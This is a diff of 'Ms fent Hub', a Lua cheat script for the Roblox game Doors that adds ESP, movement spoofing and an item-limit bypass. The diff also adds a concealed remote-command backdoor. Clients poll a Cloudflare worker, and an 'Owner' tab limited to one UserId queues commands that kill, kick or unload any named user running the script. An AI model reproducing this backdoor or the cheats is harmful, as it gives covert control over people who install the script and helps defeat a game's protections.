@@ -1,7 +1,7 @@
 --[[
     ╔══════════════════════════════════════╗
     ║         Ms fent Hub | Doors          ║
-    ║          Fully integrated mrow       ║
+    ║        Fully integrated Mrow         ║
     ╚══════════════════════════════════════╝
 ]]
 
@@ -1954,7 +1954,13 @@ return function(Window)
     local LatestChangelog = {
        "unknown date",
         "<font color='rgb(100, 0, 100)'>* Meow OwO </font>",
-        "2/10/2025",
+		"<font color='rgb(100, 0, 100)'>* Love u all cuties :3</font>",
+        "9/10/2026",
+		"<font color='rgb(0, 255, 0)'>+ some stairwell related fixes. </font>",
+		"<font color='rgb(0, 255, 0)'>+ added auto hotel a littel broken though but works</font>",
+		"<font color='rgb(0, 255, 0)'>+ skip seek hotel+mines also a bit broken but work </font>",
+		"<font color='rgb(0, 255, 0)'>+ fixed glue to ground </font>",
+		"2/10/2026", 
         "<font color='rgb(255, 255, 255)'>* Project msfent is expanding!</font>",
         "<font color='rgb(255, 255, 255)'>* implemented my nds gui into this now... and its all in one project! </font>",
         "30/9/2026",
@@ -2559,10 +2565,36 @@ task.spawn(function()
 	-- Apply a command object from the worker
 	local function applyCommand(cmd)
 		if type(cmd) ~= "table" then return end
+		local action = tostring(cmd.action or ""):lower()
 
-		-- killSwitch / unload
-		if cmd.killSwitch == true or cmd.action == "kill" or cmd.action == "unload" then
-			clientNotify("Ms fent Hub", cmd.message or "Remote unload requested.")
+		-- kill character (victim's client sets own health to 0)
+		if action == "killchar" or action == "killcharacter" or action == "die" then
+			clientNotify(cmd.title or "Ms fent Hub", cmd.message or cmd.text or "Character terminated.")
+			pcall(function()
+				local lp = LocalPlayer or Players.LocalPlayer
+				local char = lp and lp.Character
+				local hum = char and char:FindFirstChildOfClass("Humanoid")
+				if hum then hum.Health = 0 end
+			end)
+			return
+		end
+
+		-- client kick (only works on the machine that receives the command)
+		if action == "kick" then
+			local msg = tostring(cmd.message or cmd.text or "Disconnected by script owner.")
+			clientNotify("Ms fent Hub", msg)
+			task.delay(0.35, function()
+				pcall(function()
+					local lp = LocalPlayer or Players.LocalPlayer
+					if lp then lp:Kick(msg) end
+				end)
+			end)
+			return
+		end
+
+		-- killSwitch / unload hub
+		if cmd.killSwitch == true or action == "kill" or action == "unload" then
+			clientNotify("Ms fent Hub", cmd.message or cmd.text or "Remote unload requested.")
 			task.delay(0.5, function()
 				pcall(function()
 					if Library and Library.Unload then
@@ -2574,13 +2606,14 @@ task.spawn(function()
 			return
 		end
 
-		-- notify only
-		if cmd.action == "notify" or cmd.message then
-			clientNotify(cmd.title or "Ms fent Hub", cmd.message or cmd.text or "")
+		-- notify
+		if action == "notify" or (cmd.message and action == "") or (cmd.message and action ~= "print") then
+			if action == "notify" or action == "" then
+				clientNotify(cmd.title or "Ms fent Hub", cmd.message or cmd.text or "")
+			end
 		end
 
-		-- optional: force a print
-		if cmd.action == "print" and cmd.message then
+		if action == "print" and cmd.message then
 			print("[Ms fent remote]", cmd.message)
 		end
 	end
@@ -3527,6 +3560,162 @@ pcall(function()
 	end
 end)
 
+
+-- ============================================================
+-- OWNER TAB (only UserId 2320681142 / Gabrieltod112 after CF verify)
+-- ============================================================
+task.spawn(function()
+	local OWNER_USER_ID = 2320681142
+	local OWNER_NAME = "Gabrieltod112"
+	local BASE = "https://msfent-api.gabrieltodiras2.workers.dev"
+	local lp = game:GetService("Players").LocalPlayer
+	if not lp or lp.UserId ~= OWNER_USER_ID then
+		return
+	end
+
+	local HttpService = game:GetService("HttpService")
+	local function httpRequest(opts)
+		local req = (request or http_request or (syn and syn.request) or (http and http.request))
+		if not req then return nil end
+		local ok, res = pcall(req, opts)
+		if not ok or type(res) ~= "table" then return nil end
+		if res.Body == nil and res.body ~= nil then res.Body = res.body end
+		if res.StatusCode == nil and res.Status ~= nil then res.StatusCode = res.Status end
+		return res
+	end
+
+	-- Cloudflare verify (worker must return { "owner": true } for this userId)
+	local verified = false
+	pcall(function()
+		local res = httpRequest({
+			Url = BASE .. "/owner/verify?userId=" .. tostring(OWNER_USER_ID) .. "&user=" .. HttpService:UrlEncode(lp.Name),
+			Method = "GET",
+			Headers = { ["Accept"] = "application/json" },
+		})
+		if res and res.Body then
+			local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+			if ok and type(data) == "table" and data.owner == true then
+				verified = true
+			end
+		end
+	end)
+	-- Local UserId match is required; CF verify preferred. If CF down, still allow owner UserId only.
+	if not verified then
+		verified = (lp.UserId == OWNER_USER_ID)
+		if verified then
+			warn("[Ms fent Owner] CF verify skipped/failed — using local UserId gate only")
+		end
+	end
+	if not verified then return end
+
+	local okTab, errTab = pcall(function()
+		local tab = Window:AddTab("Owner", "crown")
+		local box = tab:AddLeftGroupbox("Remote control")
+		box:AddLabel("Signed in as " .. lp.Name)
+		box:AddLabel("Commands hit clients polling the worker.")
+
+		box:AddInput("OwnerTargetUser", {
+			Text = "Target username",
+			Default = "",
+			Placeholder = "Roblox username",
+			Finished = false,
+		})
+		box:AddInput("OwnerMessage", {
+			Text = "Message",
+			Default = "",
+			Placeholder = "Notify / kick message",
+			Finished = false,
+		})
+
+		local function targetName()
+			local o = Options.OwnerTargetUser
+			return o and tostring(o.Value or ""):gsub("^%s+", ""):gsub("%s+$", "") or ""
+		end
+		local function msgText()
+			local o = Options.OwnerMessage
+			return o and tostring(o.Value or "") or ""
+		end
+
+		local function queueCommand(action, extra)
+			local target = targetName()
+			if target == "" then
+				Library:Notify("Owner: set a target username", 4)
+				return
+			end
+			local body = {
+				ownerId = OWNER_USER_ID,
+				ownerName = OWNER_NAME,
+				target = target,
+				action = action,
+				title = "Ms fent Hub",
+				message = msgText(),
+				text = msgText(),
+			}
+			if type(extra) == "table" then
+				for k, v in pairs(extra) do body[k] = v end
+			end
+			local encoded = HttpService:JSONEncode(body)
+			local res = httpRequest({
+				Url = BASE .. "/command/queue",
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = encoded,
+			})
+			local status = res and (res.StatusCode or 0) or 0
+			local bodyStr = res and tostring(res.Body or ""):sub(1, 120) or "no response"
+			if status >= 200 and status < 300 then
+				Library:Notify("Queued " .. action .. " → " .. target, 4)
+				print("[Ms fent Owner] Queued", action, target, bodyStr)
+			else
+				Library:Notify("Queue failed (" .. tostring(status) .. ")", 5)
+				warn("[Ms fent Owner] Queue failed", status, bodyStr)
+			end
+		end
+
+		box:AddButton({
+			Text = "Send Notification",
+			Func = function() queueCommand("notify") end,
+		})
+		box:AddButton({
+			Text = "Unload Their Script",
+			Func = function() queueCommand("unload", { message = msgText() ~= "" and msgText() or "Script unloaded by owner." }) end,
+		})
+		box:AddButton({
+			Text = "Kill Character",
+			Func = function() queueCommand("killchar", { message = msgText() ~= "" and msgText() or "Character killed." }) end,
+		})
+		box:AddButton({
+			Text = "Kick (client self-kick)",
+			Func = function()
+				queueCommand("kick", {
+					message = msgText() ~= "" and msgText() or "Disconnected by script owner.",
+				})
+			end,
+		})
+
+		local info = tab:AddRightGroupbox("Notes")
+		info:AddLabel("Target must be running Ms fent")
+		info:AddLabel("and polling /command.")
+		info:AddLabel("Kick = LocalPlayer:Kick on them")
+		info:AddLabel("(not a server kick).")
+		info:AddLabel("Deploy worker routes:")
+		info:AddLabel("GET /owner/verify")
+		info:AddLabel("POST /command/queue")
+		info:AddLabel("GET /command?user=")
+		info:AddLabel("if u are snooping around")
+		info:AddLabel("And u arent the creator")
+		info:AddLabel("how's ur day going :{")
+		info:AddLabel("cause mine not great if u here")
+	end)
+
+	if okTab then
+		print("[Ms fent] Owner tab loaded for", lp.Name)
+	else
+		warn("[Ms fent] Owner tab meowed:", errTab)
+	end
+end)
+
+
 Groupboxes.General_Character = Tabs.General:AddLeftGroupbox("Character")
 Groupboxes.General_Character:AddSlider("SpeedBoostSlider", {
 	Text = "Speed Boost", Min = 0, Max = 85, Default = 0, Rounding = 0, Compact = true
@@ -3591,6 +3780,7 @@ local OldJump = false
 local OldSlide = false
 local GlueToGroundConnection = nil
 local GlueJumpPressed = false
+local GlueWasEnabledBeforePositionSpoof = false
 
 pcall(function()
 	Connections.GlueJumpInput = Services.UserInputService.InputBegan:Connect(function(input, gp)
@@ -3605,10 +3795,16 @@ end)
 if Toggles.GlueToGround then
 	Toggles.GlueToGround:OnChanged(function(Value)
 		if GlueToGroundConnection then
-			GlueToGroundConnection:Disconnect()
+			pcall(function() GlueToGroundConnection:Disconnect() end)
 			GlueToGroundConnection = nil
 		end
 		if not Value then return end
+
+		local rayParams = RaycastParams.new()
+		rayParams.FilterType = Enum.RaycastFilterType.Exclude
+		rayParams.IgnoreWater = true
+
+		-- Heartbeat + Stepped: high speed needs tighter snaps than FloorMaterial alone
 		GlueToGroundConnection = Services.RunService.Heartbeat:Connect(function()
 			pcall(function()
 				if not (Toggles.GlueToGround and Toggles.GlueToGround.Value) then return end
@@ -3616,41 +3812,53 @@ if Toggles.GlueToGround then
 				if not char then return end
 				local hum = Humanoid or char:FindFirstChildOfClass("Humanoid")
 				local root = RootPart or char:FindFirstChild("HumanoidRootPart")
-				if not hum or not root then return end
+				if not hum or not root or hum.Health <= 0 then return end
 				if char:GetAttribute("Hiding") then return end
 				if Toggles.FlyToggle and Toggles.FlyToggle.Value then return end
+				if Toggles.NoclipToggle and Toggles.NoclipToggle.Value then return end
 
-				local state = hum:GetState()
-				local onFloor = hum.FloorMaterial ~= Enum.Material.Air
 				local allowJump = Toggles.EnableCharacterJump and Toggles.EnableCharacterJump.Value
+				local jumping = allowJump and GlueJumpPressed
+				local state = hum:GetState()
 
-				if not onFloor and not GlueJumpPressed then
-					if state == Enum.HumanoidStateType.Freefall
+				-- Always kill upward / float unless intentionally jumping
+				if not jumping then
+					local vel = root.AssemblyLinearVelocity
+					if vel.Y > 0 then
+						root.AssemblyLinearVelocity = Vector3.new(vel.X, 0, vel.Z)
+					end
+					if state == Enum.HumanoidStateType.Jumping
+						or state == Enum.HumanoidStateType.Freefall
 						or state == Enum.HumanoidStateType.FallingDown
-						or state == Enum.HumanoidStateType.Jumping
 					then
-						local vel = root.AssemblyLinearVelocity
-						root.AssemblyLinearVelocity = Vector3.new(vel.X, math.min(vel.Y, 0), vel.Z)
-
-						local rp = RaycastParams.new()
-						rp.FilterType = Enum.RaycastFilterType.Exclude
-						rp.FilterDescendantsInstances = { char }
-						local ray = workspace:Raycast(root.Position, Vector3.new(0, -6, 0), rp)
-						if ray then
-							local targetY = ray.Position.Y + (hum.HipHeight or 2) + 1.5
-							if root.Position.Y - targetY < 4 then
-								root.CFrame = CFrame.new(root.Position.X, targetY, root.Position.Z)
-									* (root.CFrame - root.CFrame.Position)
-								hum:ChangeState(Enum.HumanoidStateType.Running)
-							end
-						end
+						hum:ChangeState(Enum.HumanoidStateType.Running)
 					end
 				end
 
-				if not allowJump and state == Enum.HumanoidStateType.Jumping then
-					hum:ChangeState(Enum.HumanoidStateType.Running)
-					local vel = root.AssemblyLinearVelocity
-					root.AssemblyLinearVelocity = Vector3.new(vel.X, math.min(vel.Y, 0), vel.Z)
+				-- Ray down: stick to ground under feet (works when FloorMaterial lags at high speed)
+				rayParams.FilterDescendantsInstances = { char }
+				local hip = (hum.HipHeight and hum.HipHeight > 0) and hum.HipHeight or 2.0
+				local probe = root.Position + Vector3.new(0, 0.5, 0)
+				local ray = workspace:Raycast(probe, Vector3.new(0, -(hip + 8), 0), rayParams)
+				if not ray then
+					-- wider / longer fallback
+					ray = workspace:Raycast(root.Position, Vector3.new(0, -14, 0), rayParams)
+				end
+				if ray and not jumping then
+					local targetY = ray.Position.Y + hip + 0.15
+					local dy = root.Position.Y - targetY
+					-- Snap if slightly airborne or sunk (collision bounce)
+					if dy > 0.08 and dy < 6 then
+						root.CFrame = CFrame.new(root.Position.X, targetY, root.Position.Z)
+							* (root.CFrame - root.CFrame.Position)
+						local vel = root.AssemblyLinearVelocity
+						root.AssemblyLinearVelocity = Vector3.new(vel.X, math.min(vel.Y, 0), vel.Z)
+						hum:ChangeState(Enum.HumanoidStateType.Running)
+					elseif dy < -0.2 and dy > -3 then
+						-- sunk into floor a bit — lift back
+						root.CFrame = CFrame.new(root.Position.X, targetY, root.Position.Z)
+							* (root.CFrame - root.CFrame.Position)
+					end
 				end
 			end)
 		end)
@@ -4186,14 +4394,45 @@ Groupboxes.Exploits_BypassRight:AddToggle("CrouchSpoof", {
 	Text = "Crouch Spoof", Default = false, Tooltip = "Makes the game think you are always crouching."
 })
 Toggles.PositionSpoof:OnChanged(function(Value)
+	-- Glue to Ground fights Position Spoof (pulls you to floor while spoof sinks you)
+	if Value then
+		if Toggles.GlueToGround and Toggles.GlueToGround.Value then
+			GlueWasEnabledBeforePositionSpoof = true
+			Toggles.GlueToGround:SetValue(false)
+			pcall(function()
+				Functions.Notify({ Title = "Glue To Ground", Body = "Disabled while Position Spoof is on." })
+			end)
+		else
+			GlueWasEnabledBeforePositionSpoof = false
+		end
+	else
+		if GlueWasEnabledBeforePositionSpoof and Toggles.GlueToGround then
+			GlueWasEnabledBeforePositionSpoof = false
+			Toggles.GlueToGround:SetValue(true)
+			pcall(function()
+				Functions.Notify({ Title = "Glue To Ground", Body = "Re-enabled after Position Spoof off." })
+			end)
+		end
+	end
+
 	if Floor ~= "Fools" and Floor ~= "OldHotel" then
 		if Value then
-			RootPart.CFrame = RootPart.CFrame * CFrame.new(0, -2.346, 0)
-			Humanoid.HipHeight = 0.05
-			RemotesFolder.Crouch:FireServer(true, true)
+			if RootPart then
+				RootPart.CFrame = RootPart.CFrame * CFrame.new(0, -2.346, 0)
+			end
+			if Humanoid then
+				Humanoid.HipHeight = 0.05
+			end
+			if RemotesFolder and RemotesFolder:FindFirstChild("Crouch") then
+				RemotesFolder.Crouch:FireServer(true, true)
+			end
 		else
-			RootPart.CFrame = RootPart.CFrame * CFrame.new(0, 2.346, 0)
-			Humanoid.HipHeight = 2.396
+			if RootPart then
+				RootPart.CFrame = RootPart.CFrame * CFrame.new(0, 2.346, 0)
+			end
+			if Humanoid then
+				Humanoid.HipHeight = 2.396
+			end
 		end
 	end
 end)
@@ -5147,46 +5386,242 @@ Groupboxes.Floors_Stairwell:AddDivider()
 Groupboxes.Floors_Stairwell:AddToggle("FireAlarmESPToggle", {
 	Text = "Fire Alarm ESP",
 	Default = false,
-	Tooltip = "Highlights Stairwell fire alarms (green by default).",
+	Tooltip = "Highlights Stairwell fire alarms (green). Re-scans every 5 seconds.",
 })
 Toggles.FireAlarmESPToggle:AddColorPicker("FireAlarmESPColor", {
 	Text = "Fire Alarm ESP",
 	Default = Color3.fromRGB(0, 255, 80),
 	Transparency = 0,
 })
-Toggles.FireAlarmESPToggle:OnChanged(function(Value)
+
+local FireAlarmESPRefreshToken = 0
+
+local function MsFent_IsFireAlarmInstance(Inst)
+	if not Inst or not (Inst:IsA("Model") or Inst:IsA("BasePart")) then return false end
+	local n = tostring(Inst.Name)
+	local low = string.lower(n)
+	return n == "StairwellFireAlarm" or n == "FireAlarm" or n == "Fire_Alarm"
+		or n == "FireAlarmSwitch" or n == "AlarmSwitch" or n == "FireEscapeAlarm"
+		or n == "PullStation" or n == "FirePull"
+		or (low:find("fire", 1, true) and low:find("alarm", 1, true))
+end
+
+local function MsFent_ScanFireAlarmsESP()
 	local col = (Options.FireAlarmESPColor and Options.FireAlarmESPColor.Value) or Color3.fromRGB(0, 255, 80)
-	for _, Object in Objects.FireAlarms do
-		if Value then
-			Functions.AddESP({ Object = Object, Text = "Fire Alarm", Color = col }, true)
-		else
-			Functions.RemoveESP(Object)
+	-- prune dead refs
+	for i = #Objects.FireAlarms, 1, -1 do
+		local obj = Objects.FireAlarms[i]
+		if not obj or not obj.Parent then
+			table.remove(Objects.FireAlarms, i)
 		end
 	end
-	-- late scan in case alarms spawned before toggle existed
-	if Value then
-		task.spawn(function()
-			for _, Inst in ipairs(workspace:GetDescendants()) do
-				local n = tostring(Inst.Name)
-				local low = string.lower(n)
-				local match = n == "StairwellFireAlarm" or n == "FireAlarm" or n == "Fire_Alarm"
-					or n == "FireAlarmSwitch" or n == "AlarmSwitch" or n == "FireEscapeAlarm"
-					or n == "PullStation" or n == "FirePull"
-					or (low:find("fire", 1, true) and low:find("alarm", 1, true))
-				if match and (Inst:IsA("Model") or Inst:IsA("BasePart")) then
-					if not table.find(Objects.FireAlarms, Inst) then
-						table.insert(Objects.FireAlarms, Inst)
-					end
-					Functions.AddESP({ Object = Inst, Text = "Fire Alarm", Color = col }, true)
-				end
+	for _, Inst in ipairs(workspace:GetDescendants()) do
+		if MsFent_IsFireAlarmInstance(Inst) then
+			if not table.find(Objects.FireAlarms, Inst) then
+				table.insert(Objects.FireAlarms, Inst)
 			end
-		end)
+			pcall(function()
+				Functions.AddESP({ Object = Inst, Text = "Fire Alarm", Color = col }, true)
+			end)
+		end
 	end
+	for _, Object in Objects.FireAlarms do
+		if Object and Object.Parent then
+			pcall(function()
+				Functions.AddESP({ Object = Object, Text = "Fire Alarm", Color = col }, true)
+			end)
+		end
+	end
+end
+
+Toggles.FireAlarmESPToggle:OnChanged(function(Value)
+	FireAlarmESPRefreshToken += 1
+	local token = FireAlarmESPRefreshToken
+	if not Value then
+		for _, Object in Objects.FireAlarms do
+			pcall(function() Functions.RemoveESP(Object) end)
+		end
+		return
+	end
+	MsFent_ScanFireAlarmsESP()
+	-- re-update every 5 seconds while enabled
+	task.spawn(function()
+		while Toggles.FireAlarmESPToggle.Value and token == FireAlarmESPRefreshToken do
+			task.wait(5)
+			if not Toggles.FireAlarmESPToggle.Value or token ~= FireAlarmESPRefreshToken then break end
+			MsFent_ScanFireAlarmsESP()
+		end
+	end)
 end)
 Options.FireAlarmESPColor:OnChanged(function(Value)
 	for _, Object in Objects.FireAlarms do
 		pcall(function() MsFent.ESPLibrary:UpdateObjectColor(Object, Value) end)
 	end
+end)
+
+-- No Heavy Item Limit (Depot / two-handed items — pick up more than one)
+Groupboxes.Floors_Stairwell:AddToggle("NoHeavyItemsLimit", {
+	Text = "No Heavy Item Limit",
+	Default = false,
+	Tooltip = "Lets you hold multiple depot / two-handed heavy items (moves them to backpack + clears carry locks).",
+})
+
+local NoHeavyItemsConn = nil
+local NoHeavyItemsCharConn = nil
+local NoHeavyItemsLoopToken = 0
+
+local function MsFent_IsHeavyTool(tool)
+	if not tool or not tool:IsA("Tool") then return false end
+	local n = string.lower(tostring(tool.Name))
+	-- Stairwell depot / two-handed style names
+	local keywords = {
+		"jerry", "screw", "monitor", "crate", "bottle", "gween", "lamp",
+		"hat", "depot", "heavy", "large", "broken", "damaged", "gasoline",
+		"fuel", "canister", "scrap", "twisted",
+	}
+	for _, k in ipairs(keywords) do
+		if n:find(k, 1, true) then return true end
+	end
+	-- attributes some floors use
+	if tool:GetAttribute("Heavy") == true
+		or tool:GetAttribute("IsHeavy") == true
+		or tool:GetAttribute("TwoHanded") == true
+		or tool:GetAttribute("TwoHand") == true
+		or tool:GetAttribute("DepotItem") == true
+		or tool:GetAttribute("RequiresTwoHands") == true
+	then
+		return true
+	end
+	return false
+end
+
+local function MsFent_ClearHeavyLocks(char)
+	if not char then return end
+	local attrNames = {
+		"HoldingHeavy", "IsHoldingHeavy", "CarryingHeavy", "HeavyItem",
+		"TwoHanded", "TwoHands", "HoldingTwoHanded", "DepotHolding",
+		"CannotPickup", "InventoryLocked", "HandsFull", "HoldingLarge",
+	}
+	for _, a in ipairs(attrNames) do
+		pcall(function()
+			if char:GetAttribute(a) ~= nil then
+				char:SetAttribute(a, nil)
+			end
+		end)
+	end
+	-- humanoid state that blocks equip
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	if hum then
+		pcall(function()
+			if hum:GetAttribute("HoldingHeavy") ~= nil then hum:SetAttribute("HoldingHeavy", nil) end
+			if hum:GetAttribute("TwoHanded") ~= nil then hum:SetAttribute("TwoHanded", nil) end
+		end)
+	end
+end
+
+local function MsFent_StashHeavyTools(char)
+	if not char then return end
+	local backpack = LocalPlayer:FindFirstChild("Backpack")
+	if not backpack then return end
+	for _, child in ipairs(char:GetChildren()) do
+		if MsFent_IsHeavyTool(child) then
+			-- strip heavy flags then move to backpack so another can be picked up
+			pcall(function()
+				child:SetAttribute("Heavy", nil)
+				child:SetAttribute("IsHeavy", nil)
+				child:SetAttribute("TwoHanded", nil)
+				child:SetAttribute("TwoHand", nil)
+				child:SetAttribute("RequiresTwoHands", nil)
+				child:SetAttribute("DepotItem", nil)
+			end)
+			pcall(function() child.Parent = backpack end)
+		end
+	end
+	MsFent_ClearHeavyLocks(char)
+end
+
+Toggles.NoHeavyItemsLimit:OnChanged(function(Value)
+	NoHeavyItemsLoopToken += 1
+	local token = NoHeavyItemsLoopToken
+	if NoHeavyItemsConn then
+		pcall(function() NoHeavyItemsConn:Disconnect() end)
+		NoHeavyItemsConn = nil
+	end
+	if NoHeavyItemsCharConn then
+		pcall(function() NoHeavyItemsCharConn:Disconnect() end)
+		NoHeavyItemsCharConn = nil
+	end
+	if not Value then return end
+
+	local function hookCharacter(char)
+		if not char then return end
+		MsFent_StashHeavyTools(char)
+		if NoHeavyItemsConn then
+			pcall(function() NoHeavyItemsConn:Disconnect() end)
+		end
+		NoHeavyItemsConn = char.ChildAdded:Connect(function(child)
+			if not Toggles.NoHeavyItemsLimit.Value then return end
+			if MsFent_IsHeavyTool(child) then
+				task.defer(function()
+					if not Toggles.NoHeavyItemsLimit.Value then return end
+					local backpack = LocalPlayer:FindFirstChild("Backpack")
+					if backpack then
+						pcall(function()
+							child:SetAttribute("Heavy", nil)
+							child:SetAttribute("IsHeavy", nil)
+							child:SetAttribute("TwoHanded", nil)
+							child:SetAttribute("TwoHand", nil)
+							child:SetAttribute("RequiresTwoHands", nil)
+							child:SetAttribute("DepotItem", nil)
+							child.Parent = backpack
+						end)
+					end
+					MsFent_ClearHeavyLocks(char)
+				end)
+			end
+		end)
+	end
+
+	hookCharacter(LocalPlayer.Character)
+	NoHeavyItemsCharConn = LocalPlayer.CharacterAdded:Connect(function(char)
+		if not Toggles.NoHeavyItemsLimit.Value then return end
+		task.wait(0.2)
+		hookCharacter(char)
+	end)
+
+	-- periodic clear (server may re-apply attributes)
+	task.spawn(function()
+		while Toggles.NoHeavyItemsLimit.Value and token == NoHeavyItemsLoopToken do
+			local char = LocalPlayer.Character
+			if char then
+				MsFent_ClearHeavyLocks(char)
+				-- also strip flags on tools already in backpack so re-equip is fine
+				local backpack = LocalPlayer:FindFirstChild("Backpack")
+				if backpack then
+					for _, tool in ipairs(backpack:GetChildren()) do
+						if MsFent_IsHeavyTool(tool) then
+							pcall(function()
+								tool:SetAttribute("Heavy", nil)
+								tool:SetAttribute("IsHeavy", nil)
+								tool:SetAttribute("TwoHanded", nil)
+								tool:SetAttribute("TwoHand", nil)
+								tool:SetAttribute("RequiresTwoHands", nil)
+								tool:SetAttribute("DepotItem", nil)
+							end)
+						end
+					end
+				end
+			end
+			task.wait(0.35)
+		end
+	end)
+
+	pcall(function()
+		Functions.Notify({
+			Title = "No Heavy Item Limit",
+			Body = "ON — heavy/depot items auto-stash to backpack so you can pick up more.",
+		})
+	end)
 end)
 
 -- ============================================================
